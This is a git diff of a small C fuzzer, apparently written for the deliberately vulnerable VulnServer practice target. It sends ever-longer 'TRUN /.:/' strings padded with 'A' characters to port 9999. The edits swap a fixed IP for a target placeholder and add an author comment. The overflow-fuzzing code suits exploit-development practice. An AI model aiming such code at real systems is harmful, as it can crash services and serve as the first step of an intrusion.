@@ -9,8 +9,15 @@
 #include <netinet/in.h>
 #include "utils.h"
 #define PORT 9999
-#define IP "192.168.0.7"
+#define IP "TARGET MACHINE IP"
 
+
+/* 
+    author: bekoo
+    github: https://github.com/amaym0nn
+    For VulnServer 
+
+*/
 int main() {
     char buff[10000] = "TRUN /.:/";
     char addStr[100] = "AAAAAAA";
@@ -33,8 +40,8 @@ int main() {
             }
             for(; x < nm; x++) {
                 concStr(buff, addStr);
-	  	printf("Buff Lenght --> %ld\n", strlen(buff));
-	   }
+        	  	printf("Buff Lenght --> %ld\n", strlen(buff));
+	        }
             int wr = write(scket, buff, sizeof(buff));
             if (wr == -1) {
                 printf("%s\n", strerror(errno));
